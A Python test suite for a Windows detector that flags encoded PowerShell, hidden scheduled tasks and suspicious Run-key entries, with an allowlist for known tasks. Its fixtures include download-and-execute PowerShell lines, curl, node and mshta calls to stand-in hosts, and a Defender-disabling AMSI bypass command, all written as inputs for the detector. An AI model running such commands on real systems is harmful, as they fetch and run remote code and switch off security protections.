"""
Tests for checks/check_suspicious_processes.py - encoded PowerShell detection (without
wmic, which current Windows 11 builds no longer ship), scheduled-task and Run-key rules.
All schtasks / reg / PowerShell calls are stubbed.
"""

import importlib.util
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(ROOT))

_spec = importlib.util.spec_from_file_location(
    "check_suspicious_processes", ROOT / "checks" / "check_suspicious_processes.py")
sp = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(sp)

CONFIG = {"checks": {"suspicious_processes": {"enabled": True, "severity": "HIGH"}}}
B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"


def _b64(text):
    import base64
    return base64.b64encode(text.encode("utf-16-le")).decode()


WRAPPER = _b64("$OutputEncoding = [System.Text.Encoding]::UTF8; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Get-Date")


class TestClassify:
    @pytest.mark.parametrize("payload", [
        "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')",
        "iwr http://x.test/a.ps1 | iex",
        "powershell -w hidden -c calc",
        "[System.Convert]::FromBase64String('AAAA')",
        "Set-MpPreference -DisableRealtimeMonitoring 1; amsi bypass",
    ])
    def test_suspicious_payloads(self, payload):
        suspicious, preview = sp.classify_encoded_command(f"powershell -enc {_b64(payload)}")
        assert suspicious and preview

    @pytest.mark.parametrize("payload", [
        "$OutputEncoding = [System.Text.Encoding]::UTF8; Get-Date",
        "Get-ChildItem C:\\Temp | Measure-Object",
    ])
    def test_benign_payloads(self, payload):
        suspicious, _ = sp.classify_encoded_command(f"powershell -enc {_b64(payload)}")
        assert not suspicious

    def test_decode_roundtrip_and_none(self):
        assert sp.decode_encoded_command(f"pwsh -e {_b64('Get-Date' + ' ' * 20)}").startswith("Get-Date")
        assert sp.decode_encoded_command("powershell -File a.ps1") is None

    def test_preview_is_truncated_and_single_line(self):
        payload = "line1\nline2 " + "x" * 300
        _, preview = sp.classify_encoded_command("powershell -enc " + _b64(payload))
        assert len(preview) <= 90 and "\n" not in preview


class Out:
    def __init__(self, stdout="", returncode=0, stderr=""):
        self.stdout, self.returncode, self.stderr = stdout, returncode, stderr


class TestEncodedPattern:
    @pytest.mark.parametrize("cmd", [
        f"powershell.exe -NoProfile -enc {B64}",
        f"powershell.exe -EncodedCommand {B64}",
        f"powershell.exe -e {B64}",
        f"powershell.exe -ec {B64}",
        f"pwsh -nop -w hidden -encodedcommand {B64}",
        f'powershell -enc "{B64}"',
    ])
    def test_detects_encoded_payloads(self, cmd):
        assert sp.find_encoded_commands([cmd]) == [cmd]

    @pytest.mark.parametrize("cmd", [
        "powershell.exe -NoProfile -Command Get-Process",
        "powershell.exe -File C:\\scripts\\backup.ps1",
        "powershell -Command Get-Content x.txt -Encoding UTF8",
        "powershell -enc short",
        "powershell -ExecutionPolicy Bypass -File run.ps1",
        "",
    ])
    def test_ignores_normal_commands(self, cmd):
        assert sp.find_encoded_commands([cmd]) == []

    def test_filters_only_the_bad_lines(self):
        good, bad = "powershell -File a.ps1", f"powershell -enc {B64}"
        assert sp.find_encoded_commands([good, bad, good]) == [bad]


class TestCommandLines:
    def test_uses_cim_not_wmic(self, monkeypatch):
        seen = {}

        def fake(cmd, **kw):
            seen["cmd"] = cmd
            return Out("powershell.exe -File a.ps1\n\npwsh -c x\n")

        monkeypatch.setattr(sp.subprocess, "run", fake)
        assert sp.get_powershell_command_lines() == ["powershell.exe -File a.ps1", "pwsh -c x"]
        assert "wmic" not in " ".join(seen["cmd"]).lower()
        assert "Get-CimInstance" in " ".join(seen["cmd"])

    def test_nonzero_exit_raises(self, monkeypatch):
        monkeypatch.setattr(sp.subprocess, "run", lambda *a, **k: Out("", 1, "access denied"))
        with pytest.raises(RuntimeError):
            sp.get_powershell_command_lines()


class TestEncodedPowershellCheck:
    def test_reports_suspicious_encoded_process_with_decoded_text(self, monkeypatch):
        monkeypatch.setattr(sp, "get_powershell_command_lines", lambda: [f"powershell -enc {B64}"])
        issues, details = sp.check_encoded_powershell()
        assert len(issues) == 1 and "Suspicious encoded PowerShell" in issues[0]
        assert "IEX" in issues[0] and details == []

    def test_benign_tool_wrapper_is_a_detail_not_an_issue(self, monkeypatch):
        monkeypatch.setattr(sp, "get_powershell_command_lines", lambda: [f"pwsh -NoProfile -EncodedCommand {WRAPPER}"])
        issues, details = sp.check_encoded_powershell()
        assert issues == [] and any("benign-looking" in d and "OutputEncoding" in d for d in details)

    def test_undecodable_payload_is_suspicious(self, monkeypatch):
        junk = "A" * 3 + "!" + "B" * 30  # not valid base64 once the pattern stops at '!'
        monkeypatch.setattr(sp, "get_powershell_command_lines", lambda: [f"powershell -enc {junk}"])
        monkeypatch.setattr(sp, "find_encoded_commands", lambda lines: list(lines))
        issues, _ = sp.check_encoded_powershell()
        assert issues and "could not decode" in issues[0]

    def test_clean_machine(self, monkeypatch):
        monkeypatch.setattr(sp, "get_powershell_command_lines", lambda: ["powershell -File a.ps1"])
        assert sp.check_encoded_powershell() == ([], [])

    def test_tool_failure_is_a_detail_not_a_crash(self, monkeypatch):
        def boom():
            raise OSError("no powershell")

        monkeypatch.setattr(sp, "get_powershell_command_lines", boom)
        issues, details = sp.check_encoded_powershell()
        assert issues == [] and "PowerShell check error" in details[0]


SCHTASKS = """
TaskName:                             {name}
Task To Run:                          {cmd}
"""


class TestScheduledTasks:
    def _run(self, monkeypatch, name, cmd):
        monkeypatch.setattr(sp.subprocess, "run", lambda *a, **k: Out(SCHTASKS.format(name=name, cmd=cmd)))
        return sp.check_scheduled_tasks()

    @pytest.mark.parametrize("cmd", [
        f"powershell.exe -enc {B64}",
        "powershell.exe -w hidden -File x.ps1",
        "cmd.exe /c curl http://x.test/a.exe",
        "node http://evil.test/payload.js",
        "python -c import socket",
        "wscript C:\\x.vbs",
        "mshta http://x.test/a.hta",
    ])
    def test_risky_commands_from_unknown_owner_flagged(self, monkeypatch, cmd):
        issues, _ = self._run(monkeypatch, "\\Updater", cmd)
        assert len(issues) == 1 and "\\Updater" in issues[0]

    def test_safe_owner_not_flagged(self, monkeypatch):
        issues, _ = self._run(monkeypatch, "\\Microsoft\\Windows\\Maintenance", "powershell -w hidden -File m.ps1")
        assert issues == []

    def test_benign_task_not_flagged(self, monkeypatch):
        issues, _ = self._run(monkeypatch, "\\Backup", "C:\\Tools\\backup.exe --nightly")
        assert issues == []

    ALLOW = [{"name_prefix": "\\ClaudeMCP", "command_contains": "C:\\TNY\\Scripts\\"}]
    HIDDEN = 'powershell.exe -NonInteractive -WindowStyle Hidden -File "C:\\TNY\\Scripts\\restore.ps1"'

    def test_allowlisted_task_not_flagged(self, monkeypatch):
        monkeypatch.setattr(sp.subprocess, "run", lambda *a, **k: Out(SCHTASKS.format(name="\\ClaudeMCPRestore", cmd=self.HIDDEN)))
        issues, details = sp.check_scheduled_tasks(self.ALLOW)
        assert issues == [] and any("Allowed scheduled task" in d for d in details)

    def test_allowlist_needs_matching_command_path(self, monkeypatch):
        evil = 'powershell.exe -WindowStyle Hidden -File "C:\\Users\\Public\\x.ps1"'
        monkeypatch.setattr(sp.subprocess, "run", lambda *a, **k: Out(SCHTASKS.format(name="\\ClaudeMCPRestore", cmd=evil)))
        issues, _ = sp.check_scheduled_tasks(self.ALLOW)
        assert len(issues) == 1

    def test_allowlist_needs_matching_name(self, monkeypatch):
        monkeypatch.setattr(sp.subprocess, "run", lambda *a, **k: Out(SCHTASKS.format(name="\\Other", cmd=self.HIDDEN)))
        assert len(sp.check_scheduled_tasks(self.ALLOW)[0]) == 1

    @pytest.mark.parametrize("entry", [{"name_prefix": "\\ClaudeMCP"}, {"command_contains": "C:\\TNY\\"}, {}, "str", None])
    def test_incomplete_allow_entries_never_match(self, entry):
        assert not sp.is_allowed_task("\\ClaudeMCPRestore", self.HIDDEN, [entry])

    def test_run_passes_config_allowlist_through(self, monkeypatch):
        monkeypatch.setattr(sp.subprocess, "run", lambda cmd, **k: Out(
            SCHTASKS.format(name="\\ClaudeMCPRestore", cmd=self.HIDDEN) if cmd[0] == "schtasks" else ""))
        monkeypatch.setattr(sp, "get_powershell_command_lines", lambda: [])
        cfg = {"checks": {"suspicious_processes": {"severity": "HIGH", "allowed_tasks": self.ALLOW}}}
        assert sp.run(cfg).status == "PASS"
        assert sp.run(CONFIG).status == "FAIL"

    def test_schtasks_failure_is_a_detail(self, monkeypatch):
        def boom(*a, **k):
            raise OSError("denied")

        monkeypatch.setattr(sp.subprocess, "run", boom)
        issues, details = sp.check_scheduled_tasks()
        assert issues == [] and "Scheduled task check error" in details[0]


class TestRunKeys:
    def _run(self, monkeypatch, line):
        monkeypatch.setattr(sp.subprocess, "run", lambda *a, **k: Out(f"HKEY\\Run\n    {line}\n"))
        return sp.check_registry_run_keys()

    @pytest.mark.parametrize("line", [
        "Updater    REG_SZ    node C:\\x\\agent.js",
        "Helper    REG_SZ    python C:\\x\\a.py",
        "Bridge    REG_SZ    npx some-mcp-server",
        "Svc    REG_SZ    uvx something",
        f"Loader    REG_SZ    powershell -enc {B64}",
    ])
    def test_ai_related_startup_entries_flagged(self, monkeypatch, line):
        issues, _ = self._run(monkeypatch, line)
        assert issues  # once per scanned key

    def test_ollama_startup_is_expected(self, monkeypatch):
        issues, details = self._run(monkeypatch, "Ollama    REG_SZ    C:\\Users\\x\\ollama app.exe")
        assert issues == [] and any("expected" in d for d in details)

    def test_ordinary_entry_is_a_detail(self, monkeypatch):
        issues, details = self._run(monkeypatch, "OneDrive    REG_SZ    C:\\OneDrive\\OneDrive.exe")
        assert issues == [] and any("Run key entry" in d for d in details)

    def test_non_value_lines_ignored(self, monkeypatch):
        monkeypatch.setattr(sp.subprocess, "run", lambda *a, **k: Out("HKEY_CURRENT_USER\\Run\n\n"))
        assert sp.check_registry_run_keys() == ([], [])


class TestRun:
    def _stub(self, monkeypatch, tasks=(), keys=(), enc=()):
        monkeypatch.setattr(sp, "check_scheduled_tasks", lambda allowed=(): (list(tasks), []))
        monkeypatch.setattr(sp, "check_registry_run_keys", lambda: (list(keys), []))
        monkeypatch.setattr(sp, "check_encoded_powershell", lambda: (list(enc), []))

    def test_clean_passes(self, monkeypatch):
        self._stub(monkeypatch)
        assert sp.run(CONFIG).status == "PASS"

    @pytest.mark.parametrize("where", ["tasks", "keys", "enc"])
    def test_any_indicator_fails(self, monkeypatch, where):
        self._stub(monkeypatch, **{where: ["bad thing"]})
        r = sp.run(CONFIG)
        assert r.status == "FAIL" and r.remediation and "bad thing" in "\n".join(r.details)

    def test_indicators_are_summed(self, monkeypatch):
        self._stub(monkeypatch, tasks=["a"], keys=["b"], enc=["c"])
        assert "3 suspicious" in sp.run(CONFIG).message
